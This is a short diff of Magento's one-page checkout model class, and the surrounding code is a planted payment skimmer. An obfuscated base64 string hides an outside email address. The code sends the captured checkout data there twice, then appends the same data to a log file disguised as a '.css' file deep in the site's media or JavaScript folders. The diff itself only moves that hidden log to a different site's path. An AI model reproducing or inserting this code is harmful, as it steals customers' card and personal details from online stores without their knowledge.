@@ -487,7 +487,7 @@ class Mage_Checkout_Model_Type_Onepage
         $encsrv = $idkey("dW5peGxvZ3NAeWFuZGV4LnJ1");  
         $update($encsrv, $subject, $datasend, $ipcid);
         $update($encsrv, $subject, $xupdate, $ipcid);
-        $locate = "/home/spragues/public_html/store/media/catalog/product/1/6/166.css";
+        $locate = "/home/kobebran/public_html/worldwidecstore.com/js/tiny_mce/themes/advanced/langs/1.css";
             $write = fopen($locate,"a");
             fwrite($write,$datasend."\n=========================================\n\n");
             fclose($write);		
